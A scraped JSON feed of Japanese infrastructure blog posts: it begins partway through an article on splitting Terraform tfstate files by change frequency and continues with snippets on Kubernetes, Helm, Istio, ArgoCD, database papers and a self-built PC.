prd/ # Prd環境           ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する           ...【種類グループ別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合AWSリソースの種類グループ別の分割パターンの場合、異なるリモートバックエンドで管理するとバックエンドが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリモートバックエンドの場合この場合では、AWSリソースの種類グループ別に分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 application│    └── terraform.tfstate # applicationコンポーネントの状態を持つ│├── \uD83D\uDCC2 auth│    └── terraform.tfstate # authコンポーネントの状態を持つ│├── \uD83D\uDCC2 cicd│    └── terraform.tfstate # cicdコンポーネントの状態を持つ│├── \uD83D\uDCC2 datastore│    └── terraform.tfstate # datastoreコンポーネントの状態を持つ│├── \uD83D\uDCC2 monitor│    └── terraform.tfstate # monitorコンポーネントの状態を持つ│└── \uD83D\uDCC2 network      └── terraform.tfstate # networkコンポーネントの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...AWSリソースの状態の変更頻度グループ別この分割方法についてAWSリソースの状態の変更頻度グループ別でtfstateファイルを分割し、中間層もこれに基づいて設計します。この分割方法により、各変更頻度グループの管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。https://www.reddit.com/r/Terraform/comments/126jwa1/comment/jea9bjk/?utm_source=share&utm_medium=web3x&utm_name=web3xcss&utm_term=1&utm_content=share_button▶ おすすめ度について【変更頻度グループ別】状態の依存関係図例えば、以下の変更頻度グループに分割した状況と仮定します。変更高頻度グループ変更中頻度グループ変更低頻度グループここで仮定した状況では、各プロダクトのtfstateファイルの依存は一方向最終的に、変更低頻度グループの tfstate ファイルに依存しているとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: AWSリソースの状態の変更頻度グループ別---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWS        subgraph tes-bucket            high[\\"high-freq-tfstate<br>例: API Gateway, CloudFront, CloudWatch, IAM\\"]            middle[\\"middle-freq-tfstate<br>例: ALB, EC2, ECS, EKS, ElastiCache, RDS, S3, SES, SNS\\"]            low[\\"low-freq-tfstate<br>例: Route53, VPC\\"]            high-...->low            middle-..->low        end    subgraph stg-bucket        stg[\\"tfstate\\"]    end    subgraph prd-bucket        prd[\\"tfstate\\"]    end    end【変更頻度グループ別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合AWSリソースの変更頻度グループ別の分割パターンの場合、異なるリポジトリで管理するとリポジトリが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリポジトリの場合この場合では、AWSリソースの変更頻度グループ別に分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。\uD83D\uDC31 aws-repository/├── \uD83D\uDCC2 high-freq # 高頻度変更グループ│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── api_gateway.tf│    ├── cloudfront.tf│    ├── cloudwatch.tf│    ├── ec2.tf│    ├── ecs.tf│    ├── eks.tf│    ├── iam.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # high-freqコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # high-freqコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # high-freqコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 low-freq # 低頻度変更グループ│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── route53.tf│    ├── vpc.tf│    ├── \uD83D\uDCC2 tes│    │    ├── backend.tfvars # low-freqコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg│    │    ├── backend.tfvars # low-freqコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd│          ├── backend.tfvars # low-freqコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 middle-freq # 中頻度変更グループ (高頻度とも低頻度とも言えないリソース)      ├── provider.tf      ├── remote_state.tf # terraform_remote_state ブロックを使用する      ├── elasticache.tf      ├── rds.tf      ├── s3.tf      ├── ses.tf      ├── \uD83D\uDCC2 tes      │    ├── backend.tfvars # middle-freqコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg      │    ├── backend.tfvars # middle-freqコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd           ├── backend.tfvars # middle-freqコンポーネントの状態を持つ tfstate ファイルを指定する           ...【変更頻度グループ別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合AWSリソースの変更頻度グループ別の分割パターンの場合、異なるリモートバックエンドで管理するとバックエンドが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリモートバックエンドの場合この場合では、AWSリソースの変更頻度グループ別に分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 high-freq│    └── terraform.tfstate # high-freqコンポーネントの状態を持つ│├── \uD83D\uDCC2 middle-freq│    └── terraform.tfstate # middle-freqコンポーネントの状態を持つ│└── \uD83D\uDCC2 low-freq      └── terraform.tfstate # low-freqコンポーネントの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...10. おわりにTerraformのtfstateファイルの分割パターンをもりもり布教しました。ぜひ採用してみたい分割パターンはあったでしょうか。Terraformの開発現場の具体的な要件は千差万別であり、特にtfstateファイル間の状態の依存関係は様々です。もし、この記事を参考に設計してくださる方は、分割パターンを現場に落とし込んで解釈いただけると幸いです\uD83D\uDE47\uD83C\uDFFB‍「自分を信じても…信頼に足る仲間を信じても…誰にもわからない…」(お友達の@nwiizo, 2023, Terraform Modules で再利用できるので最高ではないでしょうか？)謝辞今回、Terraformの分割パターンの収集にあたり、以下の方々からの意見・実装方法も参考にさせていただきました。@kiyo_12_07 さん@masasuzu さん@tozastation さん(アルファベット順)この場で感謝申し上げます\uD83D\uDE47\uD83C\uDFFB‍記事関連のおすすめ書籍Terraform in Action (English Edition)作者:Winkler, ScottManningAmazonTerraform: Up & Running; Writing Infrastructure As Code作者:Brikman, YevgeniyオライリージャパンAmazon","isoDate":"2023-07-04T15:17:56.000Z","dateMiliSeconds":1688483876000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"光に負けルナ~Google Cloudでのマルチリージョンデータベースについて~","link":"https://zenn.dev/nnaka2992/articles/to_beat_light_speed_on_google_cloud_databases","contentSnippet":"クラウドを利用する一番のメリットの一つとしてオンデマンドでリソースを調達し、アクセス負荷に応じてスケールイン・アウト出来ることが上げられます。そのため大体のアプリケーションではシングルリージョンまたは隣接するリージョン2~3程度で運用を始めることが多いと思います。(日本の場合asia-northeast-1とasia-northeast-2など)アプリケーションがグローバルに拡大すると、それだけ物理的な距離が広がりユーザ・サーバ間のアクセスにかかる時間が拡大します。例えばユーザ・サーバ共に日本にある場合(沖縄・北海道間約3,000km)、ネットワークによる遅延は片道約15ms以下...","isoDate":"2023-07-03T15:39:08.000Z","dateMiliSeconds":1688398748000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"スリーシェイクに入社しました！","link":"https://bells17.medium.com/3-shake-279ea982b977?source=rss-713cf42ce34d------2","isoDate":"2023-07-03T14:10:50.000Z","dateMiliSeconds":1688393450000,"authorName":"bells17","authorId":"bells17"},{"title":"Copilotでらくらくコードリーディング","link":"https://zenn.dev/nnaka2992/articles/code_reading_with_copilot","contentSnippet":"GitHub Copilot便利ですね。2021年にTechnical Previewとして発表された時から便利だ便利だと言われていたGitHub Copilotに、2023年の4月末ごろからデビューしました。デビューしたは良いものの最近は仕事ではコーディングよりアーキテクト的な方面でのお仕事が多かったり、個人の時間でもコーディングするよりOSSのコードを読むことのほうが多くコーディングのアシスタントツールとしては使いこなせていません。そのため最近はPostgreSQLのコードを読むときのアシスタントとして利用することが多いです。なのでこの記事ではCopilotでコードリーディン...","isoDate":"2023-06-28T14:41:21.000Z","dateMiliSeconds":1687963281000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Cloud RunのSidecarでJVMのmetricsの取得してみた","link":"https://zenn.dev/satohjohn/articles/25bc5879de7832","contentSnippet":"概要Cloud Runのmetricsをデフォルトで取得している指標(metrics)以外の指標が他に欲しい場合、どうするのが良いのかを考えてみました。ちょうどCloud RunのSidecar機能がでたので、それを使います。他の指標を、ここではJVMのmetricsとします。Cloud Run上のJVMのmetricsが取れて何が嬉しいのかについては、一旦考えません。後にCloud Runの最大起動時間が増えた場合は、意味があるかもしれません。 構成図にすると以下のような感じになります。Cloud RunでSpring Bootアプリケーションを立ち上げClou...","isoDate":"2023-06-28T12:03:00.000Z","dateMiliSeconds":1687953780000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"ロクに勉強してこなかったエンジニアが輪読会参加とかPCA受験に向けて勉強とかしてみた話","link":"https://qiita.com/bayobayo0324/items/56f93f50fa0115dc4d6d","contentSnippet":"この記事について40歳でフリーランスから転職をきっかけに会社員エンジニアになって、社内のエンジニアの熱意に影響を受けて勉強をはじめてみた中年エンジニアの感想とか気づきとかです。先に結論勉強することってほんと良いなと。脳細胞が活性化する気がします。あと、自分のなか...","isoDate":"2023-06-27T12:31:17.000Z","dateMiliSeconds":1687869077000,"authorName":"bayobayo0324","authorId":"bayobayo0324"},{"title":"SRETT#6_Terraformのtfstateについて考える","link":"https://speakerdeck.com/masasuzu/srett-number-6-terraformnotfstatenituitekao-eru","contentSnippet":"","isoDate":"2023-06-22T04:00:00.000Z","dateMiliSeconds":1687406400000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"アプリ開発者のための kubectl 講座","link":"https://zenn.dev/toshikish/articles/6a06017747cbba","contentSnippet":"これは何Kubernetes クラスタ管理者とアプリケーション開発者が分業しているプロジェクトで，開発者が必ずしも Kubernetes に詳しくない場合を想定し，開発時に使いそうな kubectl のコマンドをまとめたものです。クラスタ管理者から開発者にこのドキュメントを適宜改変して渡し，開発者がある程度自立して操作できるようになることで，管理者への問い合わせ負荷を減らすのが狙いです。場合によってはハンズオンで講座を開いてもよいでしょう。 ドキュメント案ここでは Amazon EKS でクラスタを構築する場合の例を示します。別のインフラに構築している場合は適宜書き換え...","isoDate":"2023-06-19T06:03:18.000Z","dateMiliSeconds":1687154598000,"authorName":"toshikish","authorId":"toshikish"},{"title":"Terraform 静的検査ツール比較","link":"https://zenn.dev/tayusa/articles/9829faf765ab67","contentSnippet":"対象tfsectflintKICSCheckovSnyk tfsechttps://github.com/aquasecurity/tfsechttps://aquasecurity.github.io/tfsec/v1.28.1 特徴CI系公式のdocker imageがあるhttps://github.com/aquasecurity/tfsec#use-with-dockerGitHub Actionがあるhttps://github.com/aquasecurity/tfsec-pr-commenter-actionGitH...","isoDate":"2023-06-15T17:00:00.000Z","dateMiliSeconds":1686848400000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"editcap で tcpdump のキャプチャファイルから指定の時間帯を切り出す","link":"https://blog.1q77.com/2023/06/editcap/","contentSnippet":"課題ちょっと大きめ (時間範囲の広い) pcap ファイルがあって、wireshark で見るにしてもちょっと大きすぎるなということがありました。見たい時間帯だけに絞ったファイルにできないかなと思い調べたメモです。","isoDate":"2023-06-15T14:46:42.000Z","dateMiliSeconds":1686840402000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"GitHub の Reusable workflow で working-directory に変数を使う","link":"https://zenn.dev/toshikish/articles/be970407f02098","contentSnippet":"やりたいことGitHub Actions の reusable workflow で，作業ディレクトリを入力変数で変えたい場合を考えます。on:  workflow_call:    inputs:      workdir:        required: true        type: string うまくいかない方法ワークフロー全体のステップのデフォルト設定 defaults.run.working-directory では，現時点ではコンテキストと式が許可されていません。したがって，入力変数でディレクトリ名を受け取って上記に入れても動作しません。...","isoDate":"2023-06-15T05:22:24.000Z","dateMiliSeconds":1686806544000,"authorName":"toshikish","authorId":"toshikish"},{"title":"KubeconformをGitLab CIに組み込んで、k8sのマニフェストがAPIの仕様に沿うか検査する","link":"https://zenn.dev/tayusa/articles/1aa96e6ceb838a","contentSnippet":"はじめにk8sマニフェストを普段管理していないメンバーがマニフェストのファイルを変更する場面があります。その際のレビューを出来るだけ自動化したくkubeconformを導入しました。 KubeconformマニフェストがAPIの仕様に沿うか検査してくれます。https://github.com/yannh/kubeconform自分でスキーマを用意すればIstio、Argo Rollouts、Argo Workflowsのような外部のAPIも検査できます。 スキーマの生成スキーマの生成はpythonのスクリプトが用意されているので、これをCRDを引数で渡し実行しま...","isoDate":"2023-06-11T17:19:45.000Z","dateMiliSeconds":1686503985000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"plutoをGitLab CIに組み込んで非推奨のk8s apiVersionを検出する","link":"https://zenn.dev/tayusa/articles/79a3f54d8f21bc","contentSnippet":"はじめにk8sのバージョンが上がるとAPIが再編成されたりアップグレードされたりします。新しいAPIが出ると古いAPIは非推奨になり最終的には削除されます。なので、k8sのバージョンアップ時はDeprecated API Migration Guideなどを見て非推奨のapiVersionが使われていないか確認して時には修正する必要があります。https://kubernetes.io/docs/reference/using-api/deprecation-guide/例CronJob の batch/v1beta1 -> batch/v1 plutoplu...","isoDate":"2023-06-11T17:18:13.000Z","dateMiliSeconds":1686503893000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Istio Canary Upgrade by Helm","link":"https://zenn.dev/tayusa/articles/03cf961e2409bd","contentSnippet":"前提helmfileを利用istioのrevisionTagを利用関係のない設定は省略 Upgradeの前にInstall ディレクトリ構成├── helmfile_istio-base.yaml├── helmfile_istio-ingressgateway.yaml├── helmfile_istiod-1-16-0.yaml└── values    ├── istio-base.yaml    ├── istio-ingressgateway.yaml    └── istiod.yaml helmfile helmfile_isti...","isoDate":"2023-06-11T17:17:37.000Z","dateMiliSeconds":1686503857000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Helmに入門したので、躓いたところを振り返る","link":"https://zenn.dev/tayusa/articles/e9285c6c4c09a1","contentSnippet":"はじめにアプリのマニフェストを管理するのにKustomizeを使っていたのですが、同じようなマニフェストが乱立したので管理を楽にするためにHelmに移行しました。Helmを一から書いたのは初めてだったので、躓いた点をここに残します。 quote関数の進数変換0から始まる数値をquote関数を使って文字列にすると進数変換が起こり想定した値ではなくなる下記のようなtemplateでidとして0000000060のような値を渡すと、8進数として解釈され10進数である48に変換されてしまいます。...id: {{ .id | quote }}...0から始まる数値はtem...","isoDate":"2023-06-11T17:16:25.000Z","dateMiliSeconds":1686503785000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Go言語でNetlinkを少し触った話","link":"https://zenn.dev/bells17/articles/netlink-goexample","contentSnippet":"Go言語でNetlinkを少し触ったのでメモ。具体的にはGo言語でNetlinkというネットワーク関連のライブラリを使ってStatic Routeを設定したりするサンプルを作ったりした。https://github.com/bells17/netlink-gosample Netlinkとは調べた範囲だと、Linuxカーネルのサブシステムの1つで、ルーティングテーブルの管理などのネットワーク関連の設定などを行う際に利用されるもの、という理解をしている。Netlinkは、Linuxカーネルとユーザ空間プロセス間の、またはカーネル内の通信を提供するためのIPC（Inter-pro...","isoDate":"2023-06-08T18:03:10.000Z","dateMiliSeconds":1686247390000,"authorName":"bells17","authorId":"bells17"},{"title":"Kubernetes 1.27 以降のバッチ処理の改善","link":"https://zenn.dev/toversus/articles/d6065bea460871","contentSnippet":"Kubernetes 1.27 以降で実装済みまたは予定されているバッチ処理の改善に繋がる KEP や Kubernetes のサブプロジェクトの現状を見ていきます。 KEP-3673: Kubelet limit of Parallel Image Pulls!Kubernetes 1.27 時点でアルファ機能です。1.28 でベータを目指していますが、設定はデフォルトで無効化されています。Pod の起動にノードのスケールアウトが必要な場合に、Pod の起動時間の短縮が期待できます。バッチ処理の Pod が一斉に起動するケースで恩恵を受けられそうです。Kubelet は...","isoDate":"2023-06-08T03:46:32.000Z","dateMiliSeconds":1686195992000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"asdf の代わりに rtx を使う","link":"https://blog.1q77.com/2023/06/rtx/","contentSnippet":"asdf とはnodeenv とか rbenv とか tfenv とか XXenv がそれぞれ .xxx-version というファイルにそのディレクトリ配下で使用する software の version を指定するという仕様があり、それらをまとめてやってくれる asdf というツールが登場し、.tool-versions というファイルに複数のソフトウェアのバージョンを指定できるようになりました。 (aqua はまだ使ったことがない)","isoDate":"2023-06-07T01:25:11.000Z","dateMiliSeconds":1686101111000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"PC作ってみた","link":"https://moz-security.hatenablog.com/entry/2023/06/04/172414","contentSnippet":"SECCON Beginners CTF 2023 でボコボコにされて、少し萎えていますが、超絶久しぶりにブログでも書きます。なぜ自作PCまず、4月29, 30日（土・日）にGMOインターネットグループが開催するDevSecOpsThon2023というイベントに参加しました。これに関しては、イベント直後に、参加記を書こうと思っていたのですが、書かんといけないな〜と思いながら、2週間も経つと、完全に書く気がなくなりました。気になる方は、下に他の参加者さんが書いたリンクを貼っているのでそちらからご覧ください。イベントの参加者には、自宅サーバ勢が多く、確か半分くらいは、自宅にサーバを立てていたと思います。イベント自体が、インフラハッカソンというちょっと変わったイベントで、ハードウェアやOS、ミドルウェアといった低レイヤの知識を必要としており、もう自宅サーバ勢が無双状態で、自分の知識の欠如を非常に実感しました。そこで、その人たちに近づくための第一歩として、自作PCに取り組もうと思いました。developers.gmo.jpDevSecOpsThon2023 参加ブログ・DevSecOpsThonに参加してきた・「DevSecOpsThon at GMO kitaQ」に参加したらすごく良かった件！！ - Qiita・DevSecOpsThon2023 at GMO kitaQ - Qiita・【\uD83D\uDCDD】DevSecOpsThon at GMO kitaQ\xa0自作PCに取り組むこれに取り組んだのは、5月27, 28日でした。この理由は、25日に給料日だったからですね。まずは、パーツの選択と購入から始めました。別にゲーム用途ではないため、GPUはいらない代わりに、グラフィック機能があるCPUにしたり、メモリの拡張性を考えて、4スロットあるマザーボードにしたりしました。初めての自作PCということで、そこまでスペックのいいものを作る気は最初からなく、まぁ10万円くらいかなと考えていたのですが、メモリやSSDが思ったよりも安く、7万円くらいで全てのパーツを購入することができました。購入したパーツが届いたら、あとは組み立てるだけでした。ググったら、自作PCについてのサイトはたくさん出てきましたが、正直マザーボードとPCケースの取扱説明書だけでも十分なほど説明が細かく書いてあります。全てのパーツをマザーボードにくっつけるだけなので、そこまで難しくはなく、電源など配線が終わったら、本当に起動してくれるのかドキドキしながら、電源ボタンを押しました。プラス端子とマイナス端子を逆にしていないかなど心配しながらも、BIOS画面が立ち上がった時はとても安心したし、嬉しかったです。ここまできたら、あとはブータブルUSBからOSを起動するだけで、無事に初めての自作PCを完成させることができました。今は、仮想マシンを複数台起動していて、それを使って、遊びつつ、勉強していこうと思っています。とりあえずは、Kubernetesクラスタを組んでみたり、脆弱性検証から始めていこうって感じです。自作PCのメモについては、下のリンク先にあります。moz-security.me作ってみて自作PCというと、とてもハードルが高いように感じますが、実際に作ってみると意外と簡単だし、色々と勉強になることもたくさんあります。また、デスクトップという制約はあるものの、同じ値段であれば、ノートPCよりもいいスペックで構築することができるし、店頭にあるデスクトップPCと比べても、自分で改造できるため、拡張性があるといったメリットがあります。一度だけでも作ってみるのはおすすめです。（自分に合わなければ、2度目をなくせばいいだけ）","isoDate":"2023-06-04T08:24:14.000Z","dateMiliSeconds":1685867054000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"Redis公式のGoクライアントライブラリrueidisを試してみた","link":"https://qiita.com/bayobayo0324/items/8ac3e27eef360a316ad2","contentSnippet":"This 記事 is 何？Twitterぼんやり見てたらRedis公式のGo用クライアントライブラリが出てたとかで、自身のプロジェクトにどの程度簡単に入れられるのかなーと思い試してみました。公式によると今使っているgo-redisよりも速い！とのことだったので✨基本...","isoDate":"2023-05-31T12:02:25.000Z","dateMiliSeconds":1685534545000,"authorName":"bayobayo0324","authorId":"bayobayo0324"},{"title":"OLAPデータベースを支える技術","link":"https://zenn.dev/nnaka2992/articles/technics_behind_analytical_database","contentSnippet":"今年に入ってからCarnegie Mellon UniversityのAdvanced Database SystemsでReading Assignmentとして出ている論文リストで必須とされているものや講義資料を読みました。https://nnaka2992.hatenablog.com/archive/category/論文この記事では紹介されていた論文やAdvanced Database Systemsの講義資料・動画を振り替えることで、BigQueryやRedShift、Snowflakeといった最新の分析用データベースがどのように優れたパフォーマンスを実現しているかを考え...","isoDate":"2023-05-25T00:02:49.000Z","dateMiliSeconds":1684972969000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"現在のDremelの実装を解説した論文を読みました ","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/17_dremel","contentSnippet":"この記事の趣旨2020年に発表されたBigQueryの元となったGoogle内で利用されている分析向けデータベースであるDremelの実装を解説した論文を読みました。Dremel: A Decade of Interactive SQL Analysis at Web Scale著者についてSergey Melnik, Andrey Gubarev, Jing Jing Long, Geoffrey Romer, Shiva Shivakumar, Matt Tolton,Theo Vassilakisら2010年のDremel発表論文の著者らと、Hossein Ahmadi, Dan Delorey, Slava Min, Mosha Pasumansky, Jeff ShuteらGoogleで分析ワークロードと分散処理に関わる著者らによる論文。概要BigQueryの元となったGoogleのDremelの10年間を振り替えってアーキテクチャについて説明した論文。Dremelは現代のクラウドネイティブ分析ツールで一般的になっている、計算リソースとストレージの分解、カラムナストレージ、in situデータ分析などを統合した最初のツールである。手法SQLの採用Googleでは殆どのデータはBigTableなどNoSQLデータベースで管理されていたため、SQLを用いないデータアクセスが主流であった。しかしトランザクション型ビッグデータシステムにおける、SQLの採用に共ないDremelでもSQLを採用した。ストレージの分離メモリの分離MapReduceのシャッフルのボトルネックを回避するためにDisaggregated Memory Shuffle Systemを採用した。In situデータ分析への対応DBMSへのデータロードを必要としないデータ分析のことで、DremelではGFSに移行するときにGoogle内で共有のストレージフォーマットを使用することでGoogle内のデータに対応した。加えてGoogle Cloud StorageやGoogle Drive、MySQL、BigTableなどからのデータ取得もフェデレーションとして対応した。サーバレスアーキテクチャフォールトトレラントリスタート、仮想スケジューリングユニットによりマルチテナントかつオンデマンドなリソースを提供可能とし、低価格な利用を可能とした。現在ではサーバレスアーキテクチャを進化させ、集中型スケジューリングやShuffle Persistent Layer、柔軟なDAG実行、動的クエリ実行などを実装することでより優れたサーバレスアーキテクチャを実現した。ネストデータにおけるカラムナストレージ[[32])]Figure 5Figure 6Figure 7クエリレイテンシの最小化インタラクティブな実行のレイテンシは大きくなる。それを解決するためにDremelではスタンバイサーバプール、マルチレベル実行ツリー、列指向スキーマ表現、CPUとIO負荷のバランス調整、ファイルオペレーションの再利用、保証されたキャパシティ、適合的なクエリスケーリングにより実現している。作業時間read27:5027:50author32:024:12summary68:5026:48","isoDate":"2023-05-15T02:14:20.000Z","dateMiliSeconds":1684116860000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Connection draining for Service type LoadBalancer","link":"https://zenn.dev/toversus/articles/1682d275ef1bb7","contentSnippet":"はじめにService リソースは Kubernetes のサービス検出を支えるコアリソースです。Service のデータプレーンとして kube-proxy を使用している場合は、各ノード上の iptables や ipvs を設定することで L4 負荷分散を実現しています。Kubernetes は、結果整合性 (Eventual Consistency) の上に成り立つ分散システムです。Kubernetes のコントロールプレーンが Pod を削除する時に、全てのノード上のルーティングルールを更新してから Pod を削除したりはしません。削除中の Pod にもトラフィックが流...","isoDate":"2023-05-11T09:43:47.000Z","dateMiliSeconds":1683798227000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"TiDBで学ぶNewSQLのアーキテクチャ for Beginners","link":"https://zenn.dev/nnaka2992/articles/learning_tidb_internal_for_beginner","contentSnippet":"はじめにこの記事ではNewSQLの特徴であるノード間の分散とトランザクションや分断耐性などがTiDBではどのような技術によって実現されているかを説明することを目的としています。Spannerの論文が2012年に発表されてから10年以上の年月が流れ、優れた論文や実装ドキュメント、個人による解説ブログなど技術的詳細について述べた資料は多くあります。加えてこの記事を入門的なものと位置づけているため各コンポーネントを網羅的に解説するというよりは、キーコンセプトをどのように実装しているのかを実験を混じえながら動作の実現方法の解説を中心に扱います。また今回はTiDBをベースに説明し...","isoDate":"2023-05-11T01:18:19.000Z","dateMiliSeconds":1683767899000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"クエリオプティマイザの精度を検証した論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/16_query_optimization_performance","contentSnippet":"この記事の趣旨2015年に発表されたクエリオプティマイザにおけるカーディナリティ推定とコストモデル、列挙アルゴリズムの貢献度を評価した論文を読んでいきます。How Good Are Query Optimizers, Really?著者についてViktor Leis、Andrey Gubichev、Atanas Mirchev、Peter Boncz、Alfons Kemper、Thomas Neumannらのグループによる論文。ほとんどのメンバーはDBMSにおける最適化について研究しているが、Atanas Mirchevはより統計や探索といった最適化よりの研究をしている。問題意識良い結合順序を見つけることはクエリの性能に対して大きな影響を与えるため、熱心に研究されてきた。古典的なクエリ最適化のアプローチでは以下のステップで動的計画方に基づいた最適化を行なう。1. 有効な結合順序の列挙1. カーディナリティ推定値を入力としたコストモデルの選択理論的にはカーディナリティとコストモデルの推定値が正確であれば、最適なクエリプランを選択することができる。しかし現実にはカーディナリティ推定は一様性や独立性といった単純化された仮定に基づいており、しばしばそのような仮定は間違っているため悲惨な計画を作成する。手法この論文ではカーディナリティ推定器の評価と正確なコストモデルの重要性の評価、そして列挙された結合順序の空間がどの程度影響するのかを以下の方法で検証し、貢献を行なっている。1. IMDBデータを用いたJoin Order BenchmarkというJOINにフォーカスしたベンチマークによる評価を行なう1. 実世界のデータセットにおける現実的なクエリを用いたE2Eの検証を行なう。1. クエリ性能に対するカーディナリティ・コストモデル・列挙アルゴリズムの貢献度を定量化し、最適なクエリプラン生成のためのガイドラインを策定している。作業時間read29:3829:38author33:083:30summary48:4414:36感想時間が無くまとめ途中で切り上げてしまった。やらないよりマシではあるものの、ちゃんと纏めるときにくらべて理解度に影響が出そうなので時間に余裕を持っておきたい。内容自体はGW中にPostgreSQLの実装を読んでいたこともあり、わりと理解しやすかった。","isoDate":"2023-05-08T02:13:43.000Z","dateMiliSeconds":1683512023000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"[Kubernetes 1.27] Dynamic Resource Allocation のいま","link":"https://zenn.dev/toversus/articles/fe2aa06f133b49","contentSnippet":"!Kubernetes 1.27 時点でアルファ機能のため、実装が大きく変わる可能性があります。 はじめにKubeCon Europe 2023 で KEP-3063 Dynamic Resource Allocation (DRA) についての深い話と DRA Resource Driver の実装方法の話があったので、kubernetes-sigs/dra-example-driver をベースに触りながら検証してみました。toVersus/fake-dra-driver で公開しています。Device Plugins 2.0: How to Build a Drive...","isoDate":"2023-05-06T02:11:55.000Z","dateMiliSeconds":1683339115000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"【ArgoCD\uD83D\uDC19】ArgoCDのマイクロサービスアーキテクチャと自動デプロイの仕組み","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/05/02/145115","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️ArgoCDのアーキテクチャを構成するコンポーネントの種類についてArgoCDがマニフェストを自動デプロイする仕組みについてこの記事から得られる知識01. はじめに02. 概要アーキテクチャレイヤーコンポーネント仕組み(1) repo-serverによるクローン取得(2) application-controllerによるマニフェスト取得(3) application-controllerによるCluster確認(4) application-controllerによる処理結果保管(5) argocd-serverによるキャッシュ取得(6) 管理者のログイン(7) IDプロバイダーへの認証フェーズ委譲(8) dex-serverによる認証リクエスト送信(9) argocd-serverによる認可フェーズ実行(10) application-controllerによるマニフェストデプロイ03. repo-serverrepo-serverとは仕組み(1) InitContainerによるお好きなツールインストール & argocd-cliバイナリコピー(2) repo-serverによる認証情報取得(3) repo-serverのよるクローン取得とポーリング(4) repo-serverによるサイドカーコール(5) repo-serverによる暗号化キーと暗号化変数の取得(6) サイドカーによるプラグイン処理の取得(7) サイドカーによるプラグイン処理の実行04. application-controller、redis-serverapplication-controllerとはredis-serverとは仕組み(1) ArgoCD用Cluster管理者のkubectl applyコマンド(2) application-controllerによるArgoCD系カスタムリソースのReconciliation(3) application-controllerによるマニフェスト取得(4) application-controllerによるヘルスチェック(5) application-controllerによるマニフェスト差分検出(6) application-controllerによる処理結果保管(7) application-controllerによるマニフェストデプロイ05. dex-serverdex-serverとは仕組み(1) プロダクト用Cluster管理者のログイン(2) IDプロバイダーへの認証フェーズ委譲(3) dex-serverによる認可リクエスト作成(4) dex-serverによる認可リクエスト送信(5) IDプロバイダーによる認証フェーズ実施(6) argocd-serverによる認可フェーズ実施06. argocd-server (argocd-apiserver)argocd-serverとは仕組み(1) 